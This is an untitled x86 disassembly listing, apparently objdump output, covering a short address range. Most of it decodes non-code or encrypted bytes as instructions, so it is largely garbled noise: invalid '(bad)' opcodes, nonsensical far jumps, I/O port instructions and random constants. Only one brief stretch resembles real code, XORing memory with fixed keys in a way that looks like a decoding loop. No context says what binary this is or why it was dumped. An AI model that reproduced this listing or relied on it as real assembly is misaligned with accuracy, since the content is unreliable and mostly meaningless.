  4074bf:	jmp    0xf2de:0x104452ad
  4074c6:	jg     0x4074fd
  4074c8:	ds cmp al,0x87
  4074cb:	sub    al,0xa3
  4074cd:	outs   dx,DWORD PTR ds:[esi]
  4074ce:	mov    al,0x32
  4074d0:	ret    0xfd83
  4074d3:	cdq    
  4074d4:	outs   dx,DWORD PTR ds:[esi]
  4074d5:	or     edi,DWORD PTR [ebx+0x4c97a8da]
  4074db:	rcr    DWORD PTR [ecx+eax*2],0x41
  4074df:	jae    0x407509
  4074e1:	outs   dx,DWORD PTR ds:[esi]
  4074e2:	xor    DWORD PTR [esi],edi
  4074e4:	ds stos BYTE PTR es:[edi],al
  4074e6:	mov    eax,ds:0xdf64c6a7
  4074eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074ec:	xor    BYTE PTR [esi-0x21f1c849],ah
  4074f2:	mov    al,0x1d
  4074f4:	jns    0x4074b4
  4074f6:	arpl   WORD PTR [ecx+0x78f76b8b],di
  4074fc:	cmp    BYTE PTR [edi+0x367c1282],bh
  407502:	adc    eax,DWORD PTR [edx+0x63aa690]
  407508:	aaa    
  407509:	or     BYTE PTR [edx-0x79],al
  40750c:	cwde   
  40750d:	inc    esi
  40750e:	push   cs
  40750f:	ror    DWORD PTR [esi+0x6f],1
  407512:	mov    ah,0x82
  407514:	stos   BYTE PTR es:[edi],al
  407515:	and    dh,bh
  407517:	les    ebx,FWORD PTR [ebx-0x5e1f4078]
  40751d:	jecxz  0x4074c7
  40751f:	add    ebx,edi
  407521:	push   ebx
  407522:	rcl    BYTE PTR [esi-0x3ca0b71b],0x97
  407529:	clc    
  40752a:	fwait
  40752b:	xor    al,0x75
  40752d:	cdq    
  40752e:	or     BYTE PTR [edi+eiz*4+0x2faf3e62],0x70
  407536:	add    eax,0x93e73b9d
  40753b:	and    ebp,DWORD PTR [ecx]
  40753d:	sub    ah,BYTE PTR [edi+ebx*1+0x9]
  407541:	lods   eax,DWORD PTR ds:[esi]
  407542:	fcomp  QWORD PTR [ebx+0x2e]
  407545:	out    dx,al
  407546:	je     0x407517
  407548:	dec    esp
  407549:	pop    ds
  40754a:	call   0x3759fabb
  40754f:	inc    esp
  407550:	leave  
  407551:	xor    DWORD PTR [ecx+ebx*2+0x12],edx
  407555:	ficomp DWORD PTR [edi+0x18098a45]
  40755b:	jae    0x407540
  40755d:	xlat   BYTE PTR ds:[ebx]
  40755e:	dec    ecx
  40755f:	nop
  407560:	sbb    al,0xee
  407562:	sub    eax,ecx
  407564:	and    cl,dl
  407566:	scas   al,BYTE PTR es:[edi]
  407567:	cmp    eax,0x1736a214
  40756c:	dec    esi
  40756d:	stc    
  40756e:	aaa    
  40756f:	ja     0x407526
  407571:	inc    ebx
  407572:	mov    DWORD PTR [ebp*1+0x3e05fc82],edx
  407579:	(bad)
  40757e:	xchg   esi,eax
  40757f:	(bad)  
  407580:	fild   WORD PTR [eax]
  407582:	xor    al,0xfc
  407584:	call   0xcab3:0x9b984679
  40758b:	xchg   ebp,eax
  40758c:	mov    ebp,DWORD PTR [ebp+eiz*8+0x6a]
  407590:	adc    BYTE PTR [ebx-0x53f04bb3],cl
  407596:	enter  0xc102,0xe9
  40759a:	add    ah,BYTE PTR [esi-0x75]
  40759d:	enter  0x458b,0xb0
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0x53
  407613:	test   esi,ebp
  407615:	mov    esi,0x18187d17
  40761a:	sahf   
  40761b:	adc    bl,BYTE PTR [eax]
  40761d:	sbb    cl,bl
  40761f:	stos   BYTE PTR es:[edi],al
  407620:	jae    0x40761a
  407622:	adc    DWORD PTR [edi+eax*2-0x4a68aaad],ebp
  407629:	fisttp QWORD PTR [esi+0x7f]
  40762c:	lds    esp,FWORD PTR [ebx-0x64]
  40762f:	xchg   edx,eax
  407630:	xchg   ebp,eax
  407631:	ss adc ah,cl
  407634:	jo     0x407622
  407636:	sbb    eax,DWORD PTR [edx-0x115823b0]
  40763c:	(bad)  
  40763d:	push   esp
  40763e:	cmp    eax,0xfa735787
  407643:	mov    ecx,0x9c0fbe0e
  407648:	xchg   edx,eax
  407649:	or     esi,esi
  40764b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40764c:	and    al,0x7f
  40764e:	dec    ecx
  40764f:	sub    BYTE PTR [edi+0x62],cl
  407652:	sub    eax,0x2d760e39
  407657:	pop    edx
  407658:	push   edi
  407659:	popa   
  40765a:	ffreep st(6)
  40765c:	add    esi,DWORD PTR [edi+eiz*2]
  40765f:	jge    0x4076a0
  407661:	jb     0x4076d9
  407663:	cwde   
  407664:	cmp    edx,ebp
  407666:	mov    edx,0x1a7f46f
  40766b:	or     al,0x5c
  40766d:	mov    dh,0x4d
  40766f:	mov    bh,0x1
  407671:	retf   
  407672:	cmp    BYTE PTR [ebp+0x60a7b272],0x28
  407679:	test   DWORD PTR [ebx+0x7e],ecx
  40767c:	popa   
  40767d:	fwait
  40767e:	sub    dh,BYTE PTR [ecx+0x4f1d992e]
  407684:	jb     0x407653
  407686:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407688:	mov    ebp,0xe8f6d00c
  40768d:	es inc edi
  40768f:	pop    ecx
  407690:	mov    dh,cl
  407692:	loopne 0x40770a
  407694:	loope  0x407662
  407696:	lea    ecx,[ebx+0x66]
  407699:	push   ebx
  40769a:	popf   
  40769b:	jne    0x407709
  40769d:	mov    al,ds:0xaaf16d2d
  4076a2:	pusha  
  4076a3:	out    0x62,al
  4076a5:	out    0x5b,al
  4076a7:	repnz in al,0xaa
  4076aa:	sbb    ch,BYTE PTR [edi]
  4076ac:	dec    ebp
  4076ad:	js     0x4076e8
  4076af:	xchg   edi,eax
  4076b0:	add    al,0x50
  4076b2:	(bad)  
  4076b3:	sar    DWORD PTR [ebx+0x43],cl
  4076b6:	xchg   BYTE PTR [esi+0x7f60515b],ah
  4076bc:	ins    DWORD PTR es:[edi],dx
  4076bd:	mov    ecx,0x43b88534
  4076c2:	or     eax,0x4dd28f1b
  4076c7:	push   ds
  4076c8:	inc    esi
  4076c9:	repnz xor DWORD PTR [ecx-0x6e],esp
  4076cd:	pop    ss
  4076ce:	(bad)  
  4076cf:	jb     0x4076e7
  4076d1:	mov    ebx,ds
  4076d3:	fld    QWORD PTR [ecx-0x3a]
  4076d6:	sahf   
  4076d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076d8:	push   edi
  4076d9:	jmp    0x4076ad
  4076db:	icebp  
  4076dc:	inc    edi
  4076dd:	jbe    0x4076dc
  4076df:	sar    DWORD PTR [eax-0x305114e3],0x18
  4076e6:	mov    dh,0xc3
  4076e8:	adc    dh,BYTE PTR [eax+ebp*2+0x7729befb]
  4076ef:	mov    ecx,ebp
  4076f1:	push   edx
  4076f2:	xchg   esp,eax
  4076f3:	cs mov esi,0xcc3fe24b
  4076f9:	cmp    bh,BYTE PTR [eax]
  4076fb:	inc    edi
  4076fc:	inc    eax
  4076fd:	and    al,0x94
  4076ff:	inc    esi
  407700:	adc    al,0x38
  407702:	fwait
  407703:	dec    esp
  407704:	test   eax,0x8ee79652
  407709:	scas   eax,DWORD PTR es:[edi]
  40770a:	mov    esp,0xd83ce699
  40770f:	inc    esi
  407710:	clc    
  407711:	cmp    edx,DWORD PTR [ebx]
  407713:	lods   al,BYTE PTR ds:[esi]
  407714:	outs   dx,BYTE PTR ds:[esi]
  407715:	push   esi
  407716:	add    eax,0xf7b65282
  40771b:	(bad)  
  40771c:	(bad)  
  40771d:	push   0x760b874e
  407722:	sbb    ebx,DWORD PTR [edx+0x2b]
  407725:	aam    0x3d
  407727:	or     DWORD PTR [ecx],0xffffffb6
  40772a:	cmc    
  40772b:	mov    eax,0xa5df21ba
  407730:	add    DWORD PTR [ebp-0x47],esp
  407733:	xor    eax,esp
  407735:	cmp    bl,BYTE PTR ds:0x69bd57d
  40773b:	xor    eax,0xaac3b236
  407740:	push   ss
  407741:	or     ebx,0x3615e24c
  407747:	jnp    0x4077b5
  407749:	mov    ebx,0xea08aeed
  40774e:	inc    eax
  40774f:	pop    esi
  407750:	nop
  407751:	sub    edx,ebx
  407753:	push   ecx
  407754:	or     ecx,ecx
  407756:	lock je 0x40778d
  407759:	xchg   ebp,eax
  40775a:	ss in  eax,0x83
  40775d:	movntq QWORD PTR ds:0x93ce14fd,mm2
  407764:	dec    edi
  407765:	mov    bh,0xe5
  407767:	push   ecx
  407768:	out    0xeb,eax
  40776a:	std    
  40776b:	push   es
  40776c:	dec    ebx
  40776d:	mov    eax,0xcb7468a9
  407772:	inc    esi
  407773:	or     eax,0x295a3b36
  407778:	cwde   
  407779:	out    dx,eax
  40777a:	arpl   sp,bx
  40777c:	jmp    0x1d5e1a78
  407781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407782:	inc    eax
  407783:	call   0x2ddc:0xef868eb5
  40778a:	jae    0x407740
  40778c:	inc    ebx
  40778d:	sub    DWORD PTR [esi],ebp
  40778f:	ss cwde 
  407791:	bound  esp,QWORD PTR [eax+0x7f]
  407794:	leave  
  407795:	aad    0x6d
  407797:	gs pop edx
  407799:	imul   esi,DWORD PTR ds:0x67fcafa6,0x1540ff74
  4077a3:	scas   al,BYTE PTR es:[edi]
  4077a4:	cmp    al,0x1
  4077a6:	ret    0xd760
  4077a9:	adc    eax,0xbf092865
  4077ae:	pop    edi
  4077af:	mov    bh,0xda
  4077b1:	ret    
  4077b2:	inc    esi
  4077b3:	pop    es
  4077b4:	(bad)  
  4077b5:	movzx  ecx,WORD PTR [ebx]
  4077b8:	jl     0x4077cf
  4077ba:	cmp    eax,0xfdf3d7aa
  4077bf:	push   cs
  4077c0:	or     DWORD PTR [esi-0x13],eax
  4077c3:	inc    ebx
  4077c4:	pusha  
  4077c5:	cmp    esp,esp
  4077c7:	mov    al,ds:0xdb8af3b5
  4077cc:	psubb  mm4,QWORD PTR [eax+0x76]
  4077d0:	lock adc ecx,edx
  4077d3:	xor    ebx,DWORD PTR [edx]
  4077d5:	xchg   esi,eax
  4077d6:	jmp    0x5838:0x8b816158
  4077dd:	aas    
  4077de:	adc    BYTE PTR [edi],dl
  4077e0:	std    
  4077e1:	adc    ah,BYTE PTR [ebx+0x4]
  4077e4:	xlat   BYTE PTR ds:[ebx]
  4077e5:	stc    
  4077e6:	pop    ss
  4077e7:	jle    0x40785e
  4077e9:	or     dl,BYTE PTR [edx-0x49578c7f]
  4077ef:	or     eax,0xf74dfc56
  4077f4:	sub    BYTE PTR [ecx+0x21ae0f31],0x15
  4077fb:	adc    ecx,DWORD PTR [edx+0x40]
  4077fe:	mov    ch,0x1d
  407800:	push   0x0
  407802:	add    eax,0xffbf76ea
  407807:	mov    esp,0x83982793
  40780c:	lea    eax,[eax+0x1163ad23]
  407812:	shl    BYTE PTR [eax+0x29],0xca
  407816:	iret   
  407817:	clc    
  407818:	push   0x63
  40781a:	adc    edi,DWORD PTR [ecx+esi*4+0xe25be60]
  407821:	fwait
  407822:	ror    BYTE PTR [eax],cl
  407824:	out    dx,eax
  407825:	cld    
  407826:	xlat   BYTE PTR ds:[ebx]
  407827:	mov    ebx,0x88e81acc
  40782c:	daa    
  40782d:	xchg   ebx,eax
  40782e:	xor    BYTE PTR [eax-0x4c7059b4],dh
  407834:	cmp    DWORD PTR [esi-0x1d],0x60
  407838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407839:	pop    edx
  40783a:	push   edi
  40783b:	cmp    dh,dh
  40783d:	inc    edi
  40783e:	mov    dh,0x9e
  407840:	ret    
  407841:	cwde   
  407842:	push   cs
  407843:	push   cs
  407844:	add    eax,0xec4443ce
  407849:	push   ecx
  40784a:	fidivr WORD PTR [eax+0x42]
  40784d:	(bad)  
  40784e:	jmp    0x2a8e7c56
  407853:	nop
  407854:	pop    ds
  407855:	out    0x47,al
  407857:	inc    DWORD PTR [edx+0x3dfe02dc]
  40785d:	xor    eax,0xfc1044ec
  407862:	sbb    ebx,ebx
  407864:	into   
  407865:	or     edi,DWORD PTR [eax]
  407867:	inc    edx
  407868:	fbld   TBYTE PTR [ebx+0x7d738d1f]
  40786e:	push   es
  40786f:	sar    DWORD PTR [ecx+0x3],0x48
  407873:	popf   
  407874:	div    DWORD PTR [esi-0x3072c48a]
  40787a:	mov    esi,0xd6bd42be
  40787f:	mov    ah,0xa6
  407881:	clc    
  407882:	outs   dx,BYTE PTR ds:[esi]
  407883:	mov    esi,0xdf6d165f
  407888:	fwait
  407889:	sbb    ebx,ecx
  40788b:	pop    ecx
  40788c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40788d:	(bad)  
  40788e:	mov    dh,0x6a
  407890:	dec    ebp
  407891:	adc    BYTE PTR [esi+0x34],dl
  407894:	test   al,0x5b
  407896:	push   0x1c23728d
  40789b:	mov    al,0x88
  40789d:	std    
  40789e:	fimul  DWORD PTR [edx-0x1bd0c0f2]
  4078a4:	adc    dl,BYTE PTR [edx+0x2e]
  4078a7:	mov    ds:0x554b3476,al
  4078ac:	daa    
  4078ad:	pop    eax
  4078ae:	call   FWORD PTR [esi+0x607c1b74]
  4078b4:	mov    ds:0x27a51e10,eax
  4078b9:	loopne 0x407886
  4078bb:	leave  
  4078bc:	inc    esi
  4078bd:	xchg   esi,eax
  4078be:	push   esp
  4078bf:	in     al,0xde
  4078c1:	mov    ds:0xf87d4ac5,eax
  4078c6:	mov    edx,0x3f468e07
  4078cb:	or     eax,DWORD PTR [edx]
  4078cd:	(bad)  [eax+0x469409b7]
  4078d3:	loopne 0x4078f3
  4078d5:	cwde   
  4078d6:	push   esp
  4078d7:	fisub  WORD PTR [ecx]
  4078d9:	(bad)  
  4078da:	pusha  
  4078db:	mov    edi,esp
  4078dd:	inc    ebp
  4078de:	and    al,BYTE PTR [eax]
  4078e0:	jo     0x4078c2
  4078e2:	add    esi,ebp
  4078e4:	rol    BYTE PTR ds:0x9cfdc0e8,cl
  4078ea:	shl    dl,0x99
  4078ed:	test   al,0x3d
  4078ef:	mov    ds:0x8450b5bf,al
  4078f4:	ds push 0x3b
  4078f7:	jecxz  0x4078d9
  4078f9:	lds    ecx,FWORD PTR ds:0x57317b84
  4078ff:	sbb    al,0x96
  407901:	sti    
  407902:	and    eax,0xc596ebf5
  407907:	jmp    0x407962
  407909:	out    dx,al
  40790a:	jne    0x4078df
  40790c:	dec    ebx
  40790d:	and    eax,0xf4aba584
  407912:	je     0x40789e
  407914:	and    eax,DWORD PTR [eax]
  407916:	pop    ds
  407917:	retf   0xf780
  40791a:	ins    BYTE PTR es:[edi],dx
  40791b:	push   ebx
  40791c:	or     eax,ecx
  40791e:	xchg   ebp,eax
  40791f:	push   ecx
  407921:	imul   ecx,eax,0xa7bbae55
  407927:	outs   dx,DWORD PTR ds:[esi]
  407928:	sub    al,0x19
  40792a:	mov    edi,0x7a897405
  40792f:	push   ecx
  407930:	loopne 0x40793e
  407932:	lods   al,BYTE PTR ds:[esi]
  407933:	xchg   edx,eax
  407934:	les    ecx,FWORD PTR [edi+0x4789248b]
  40793a:	jnp    0x4078da
  40793c:	jo     0x4079b9
  40793e:	and    al,0xea
  407940:	sti    
  407941:	bound  ebx,QWORD PTR [eax+edx*2]
  407944:	dec    ebx
  407945:	jo     0x4079c5
  407947:	cli    
  407948:	daa    
  407949:	xor    ebx,DWORD PTR ds:[edx]
  40794c:	cmp    eax,0x9a52d3b8
  407951:	mov    eax,0x6fac6618
  407956:	jmp    0xb324:0xd9e6755c
  40795d:	mov    ecx,0xd8de7508
  407962:	mov    esi,0x82ecae63
  407967:	add    esi,ebp
  407969:	imul   esi,esi,0x12
  40796c:	and    DWORD PTR [eax],0x4b341cfb
  407972:	js     0x4079df
  407974:	xchg   ebx,eax
  407975:	mov    esp,0x98fd161
  40797a:	xchg   BYTE PTR [ecx-0x55e36987],al
  407980:	mov    ss,WORD PTR [esi+0x5f]
  407983:	les    ebx,FWORD PTR [ecx-0x69]
  407986:	test   eax,0xdc54ef24
  40798b:	mov    ch,0x48
  40798d:	stos   BYTE PTR es:[edi],al
  40798e:	cmp    BYTE PTR fs:[edx+0x645d3135],bl
  407995:	dec    edx
  407996:	jg     0x4079fa
  407998:	mov    ah,0xab
  40799a:	or     BYTE PTR [eax-0x391873bd],dl
  4079a0:	dec    ebp
  4079a1:	lods   eax,DWORD PTR ds:[esi]
  4079a2:	xchg   edi,eax
  4079a3:	test   BYTE PTR [edx],ch
  4079a5:	dec    eax
  4079a6:	sbb    ebp,esi
  4079a8:	ret    0x13f6
  4079ab:	scas   eax,DWORD PTR es:[edi]
  4079ac:	pushf  
  4079ad:	and    al,0x97
  4079af:	pop    eax
  4079b0:	inc    DWORD PTR [edi+ebx*4-0x46]
  4079b4:	hlt    
  4079b5:	adc    al,0xa
  4079b7:	xchg   BYTE PTR [ebx+0x2f],al
  4079ba:	pop    esi
  4079bb:	scas   eax,DWORD PTR es:[edi]
  4079bc:	cmp    al,0xa4
  4079be:	mov    al,0xd9
  4079c0:	fmul   DWORD PTR [esi-0x168b9ab3]
  4079c6:	sahf   
  4079c7:	fs inc ebx
  4079c9:	ficom  WORD PTR [ebx-0x2174c1]
  4079cf:	adc    cl,BYTE PTR es:[ecx+0x41]
  4079d3:	cmp    BYTE PTR [ebp+0x2737e687],0x23
  4079da:	mov    DWORD PTR [eax+0x5c],ebx
  4079dd:	fisubr DWORD PTR [edi-0x1633ba77]
  4079e3:	fld    DWORD PTR [ebx]
  4079e5:	add    BYTE PTR [eax],al
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x407a3d
  4079f4:	(bad)  
  4079f5:	fstp   TBYTE PTR [esi-0x63]
  4079f8:	jne    0x407a12
  4079fa:	sbb    BYTE PTR [esi-0x1e7e7ee],bl
  407a00:	or     esp,DWORD PTR [ebx]
  407a02:	stc    
  407a03:	loope  0x4079bb
  407a05:	call   0x893b3676
  407a0a:	xlat   BYTE PTR ds:[ebx]
  407a0b:	inc    ebx
  407a0c:	in     eax,0x2
  407a0e:	push   esi
  407a0f:	xlat   BYTE PTR ds:[ebx]
  407a10:	mov    edi,0x7df74546
  407a15:	lds    edx,FWORD PTR [edi+0x20]
  407a18:	js     0x4079f5
  407a1a:	lahf   
  407a1b:	retf   0x1bc3
  407a1e:	xchg   ecx,eax
  407a1f:	cs test BYTE PTR gs:[ebx],ah
  407a23:	mov    DWORD PTR [esi-0x11],ecx
  407a26:	pop    ecx
  407a27:	out    0x75,eax
  407a29:	inc    ecx
  407a2a:	repnz xchg ecx,eax
  407a2c:	aas    
  407a2d:	dec    esi
  407a2e:	loop   0x4079ec
  407a30:	mov    esp,0x6f31b2d5
  407a35:	jmp    0xa5f9:0xb0efd1a4
  407a3c:	lods   eax,DWORD PTR ds:[esi]
  407a3d:	adc    eax,0xb615f821
  407a42:	mov    ebp,0xd7af0d45
  407a47:	lods   eax,DWORD PTR ds:[esi]
  407a48:	mov    ds:0x48c4a91f,eax
  407a4d:	call   0xdfe7:0x75a78a77
  407a54:	mov    eax,0xf7544286
  407a59:	adc    DWORD PTR [eax],edx
  407a5b:	loope  0x407a80
  407a5d:	push   ebx
  407a5e:	dec    ebx
  407a5f:	outs   dx,DWORD PTR ds:[esi]
  407a60:	cli    
  407a61:	sahf   
  407a62:	inc    esi
  407a63:	pop    ss
  407a64:	fcmove st,st(3)
  407a66:	dec    edi
  407a67:	(bad)  
  407a68:	jge    0x407aad
  407a6a:	xchg   esp,edx
  407a6c:	ficom  WORD PTR [esi]
  407a6e:	dec    edx
  407a6f:	mov    BYTE PTR [ecx+0x5b],ah
  407a72:	cld    
  407a73:	dec    eax
  407a74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a75:	mov    ds:0xf7fb0627,eax
  407a7a:	arpl   WORD PTR [esi-0x114d16b4],ax
  407a80:	mov    dl,0xb6
  407a82:	or     eax,0xf7b352ca
  407a87:	mov    ebp,0x59b892a7
  407a8c:	pop    ecx
  407a8d:	fnstsw WORD PTR [edi]
  407a8f:	sub    edx,ebx
  407a91:	lea    eax,[edi+0x69]
  407a94:	in     eax,dx
  407a95:	add    al,0xa2
  407a97:	xchg   ebx,eax
  407a98:	aas    
  407a99:	push   ds
  407a9a:	ficomp WORD PTR [edx]
  407a9c:	mov    ah,0x94
  407a9e:	enter  0x1c42,0x2e
  407aa2:	dec    edi
  407aa3:	mov    bl,0xa2
  407aa5:	dec    esi
  407aa6:	out    dx,al
  407aa7:	push   esi
  407aa8:	and    BYTE PTR [ebx+edx*2+0x2bf1fb1e],0x5c
  407ab0:	jbe    0x407b14
  407ab2:	push   edi
  407ab3:	div    al
  407ab5:	sbb    edi,DWORD PTR [ebx-0x51a05ede]
  407abb:	jle    0x407b17
  407abd:	xor    DWORD PTR [esi+0x6f],esp
  407ac0:	outs   dx,BYTE PTR ds:[esi]
  407ac1:	jbe    0x407aeb
  407ac3:	sbb    eax,0xbbde97a8
  407ac8:	scas   al,BYTE PTR es:[edi]
  407ac9:	(bad)  
  407acb:	sub    ecx,DWORD PTR [eax-0x3]
  407ace:	jle    0x407a6b
  407ad0:	sub    ebx,DWORD PTR ds:0x9c67329
  407ad6:	jl     0x407aca
  407ad8:	daa    
  407ad9:	inc    edx
  407ada:	jbe    0x407a62
  407adc:	jle    0x407acd
  407ade:	into   
  407adf:	fdivr  DWORD PTR [edi+0x5de0ba8a]
  407ae5:	push   es
  407ae6:	mov    al,0x9d
  407ae8:	pushf  
  407ae9:	(bad)  
  407aea:	aad    0x6c
  407aec:	push   ebx
  407aed:	ret    
  407aee:	sbb    eax,DWORD PTR [edx]
  407af0:	pop    esi
  407af1:	call   DWORD PTR [eax+0x4e76b4f0]
  407af7:	adc    DWORD PTR [edi],ebx
  407af9:	icebp  
  407afa:	and    al,0x41
  407afc:	bound  edx,QWORD PTR [eax]
  407afe:	sub    al,0xf6
  407b00:	mov    ds:0xf4e6331a,al
  407b05:	loopne 0x407b76
  407b07:	push   es
  407b08:	cli    
  407b09:	mov    ebx,0xc0830bf0
  407b0e:	mov    ds:0x937b510,al
  407b13:	mov    WORD PTR [edi+ebx*4],ds
  407b16:	jns    0x407b4e
  407b18:	data16 sub bh,BYTE PTR [ebx-0x6a263982]
  407b1f:	bound  eax,QWORD PTR [esi-0x54]
  407b22:	mov    ds,eax
  407b24:	test   DWORD PTR [ecx],esp
  407b26:	inc    ebp
  407b27:	stos   BYTE PTR es:[edi],al
  407b28:	loop   0x407ac4
  407b2a:	addr16 out dx,eax
  407b2c:	cmp    ebx,eax
  407b2e:	icebp  
  407b2f:	nop
  407b30:	dec    esp
  407b31:	(bad)  
  407b32:	(bad)  
  407b33:	jbe    0x407b7e
  407b35:	mov    ds:0xa606285b,al
  407b3a:	ss adc al,0xae
  407b3d:	stos   BYTE PTR es:[edi],al
  407b3e:	add    al,0xb4
  407b40:	je     0x407b68
  407b42:	inc    ecx
  407b43:	mov    bh,0x2a
  407b45:	or     BYTE PTR [ecx-0xa],dl
  407b48:	in     eax,dx
  407b49:	and    al,0x19
  407b4b:	pop    ecx
  407b4c:	aad    0x83
  407b4e:	out    dx,eax
  407b4f:	xchg   ebp,eax
  407b50:	mov    ds:0xc3aa6bec,al
  407b55:	xor    DWORD PTR [ebx],edi
  407b57:	pop    es
  407b58:	or     bl,al
  407b5a:	ret    
  407b5b:	pop    esi
  407b5c:	cmc    
  407b5d:	inc    ebp
  407b5e:	dec    ebx
  407b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b60:	jg     0x407bd3
  407b62:	sbb    esi,DWORD PTR [ebx+0x4f]
  407b65:	mov    edi,DWORD PTR [esi]
  407b67:	inc    ebp
  407b68:	rcl    esp,1
  407b6a:	mov    dh,0x84
  407b6c:	aam    0x88
  407b6e:	xor    al,0xc1
  407b70:	sbb    ebx,DWORD PTR [ebx-0x1a]
  407b73:	xchg   edi,eax
  407b74:	inc    edi
  407b75:	out    dx,al
  407b76:	ins    DWORD PTR es:[edi],dx
  407b77:	cmp    edx,ebp
  407b79:	or     eax,0x8adf9eae
  407b7e:	inc    edi
  407b7f:	fs sahf 
  407b81:	push   esi
  407b82:	adc    BYTE PTR [ecx+0x14],cl
  407b85:	adc    eax,0xc85cc86f
  407b8a:	jmp    0x9a7472b0
  407b8f:	adc    eax,DWORD PTR [ebx+0xab4d1bc]
  407b95:	cld    
  407b96:	jle    0x407b75
  407b98:	push   esp
  407b99:	rcr    al,1
  407b9b:	mov    DWORD PTR [ebp-0xa2be3c0],ecx
  407ba1:	mov    ebx,0xbff24369
  407ba6:	xchg   DWORD PTR [eax],ebp
  407ba8:	out    0xab,al
  407baa:	jne    0x407b36
  407bac:	pop    edx
  407bad:	jne    0x407b8e
  407baf:	std    
  407bb0:	and    eax,0xc61361f6
  407bb5:	dec    eax
  407bb6:	add    BYTE PTR [esi],al
  407bb8:	in     al,dx
  407bb9:	mov    cl,0x94
  407bbb:	arpl   WORD PTR [edx+0x6f],sp
  407bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bbf:	es jnp 0x407be1
  407bc2:	jae    0x407b7f
  407bc4:	sub    al,0x21
  407bc6:	mov    eax,ebx
  407bc8:	loopne 0x407bcc
  407bca:	pop    ss
  407bcb:	test   eax,0x7a3f1d11
  407bd0:	cdq    
  407bd1:	test   eax,0x79959c47
  407bd6:	lds    ebp,FWORD PTR [esi]
  407bd8:	pop    edx
  407bd9:	jg     0x407bca
  407bdb:	inc    ecx
  407bdc:	adc    al,0x74
  407bde:	fadd   st(3),st
  407be0:	imul   DWORD PTR [esi]
  407be2:	adc    BYTE PTR [edi],dh
  407be4:	f2xm1  
  407be6:	mov    ebx,0xabfa0a87
  407beb:	dec    esi
  407bec:	ins    DWORD PTR es:[edi],dx
  407bed:	dec    esp
  407bee:	sub    DWORD PTR [ebp+ecx*4-0x74f9aa5d],0x38
  407bf6:	sti    
  407bf7:	mov    dh,0xe1
  407bf9:	push   edi
  407bfa:	xchg   esi,eax
  407bfb:	(bad)  
  407bfc:	loopne 0x407bf0
  407bfe:	ins    DWORD PTR es:[edi],dx
  407bff:	test   DWORD PTR [eax+0x1d1d7a4e],0xda0cb869
  407c09:	aad    0xe2
  407c0b:	in     eax,0x17
  407c0d:	(bad)  [esi]
  407c0f:	lods   eax,DWORD PTR ds:[esi]
  407c10:	fabs   
  407c12:	or     cl,BYTE PTR [eax+0x6c54b80f]
  407c18:	push   esp
  407c19:	test   DWORD PTR [esi-0x6e4600df],edx
  407c1f:	pusha  
  407c20:	and    ebp,esp
  407c22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c23:	ret    0x1f2
  407c26:	jno    0x407c24
  407c28:	shr    DWORD PTR [esi+0x43],1
  407c2b:	push   ds
  407c2c:	mov    ebp,DWORD PTR [edi-0x62]
  407c2f:	aam    0x5a
  407c31:	and    esi,DWORD PTR [esi+0x37]
  407c34:	mov    bh,0x21
  407c36:	loope  0x407ca4
  407c38:	mov    edx,?
  407c3a:	xchg   esi,eax
  407c3b:	sbb    dl,BYTE PTR [edi-0x48c8f54c]
  407c41:	mov    ds:0xcfee7ecf,al
  407c46:	or     eax,0x9e09122f
  407c4b:	push   edx
  407c4c:	repz mov edi,0x5f2a858c
  407c52:	or     ebp,DWORD PTR [edx-0x2591a2d6]
  407c58:	clc    
  407c59:	repz leave 
  407c5b:	inc    eax
  407c5c:	push   esp
  407c5d:	arpl   WORD PTR [esp+edi*4-0x7028f9e2],dx
  407c64:	xchg   esp,eax
  407c65:	sbb    eax,0xb4e0b1bf
  407c6a:	imul   esp,DWORD PTR [eax-0x69],0xffffffd1
  407c6e:	mov    ebx,0x6c6ac786
  407c73:	ss leave 
  407c75:	add    esp,DWORD PTR [edx-0x1d12048b]
  407c7b:	scas   eax,DWORD PTR es:[edi]
  407c7c:	pop    eax
  407c7d:	sbb    al,ah
  407c7f:	cdq    
  407c80:	push   es
  407c81:	(bad)  
  407c82:	shl    bh,0xdf
  407c85:	das    
  407c86:	add    ebp,esi
  407c88:	inc    edx
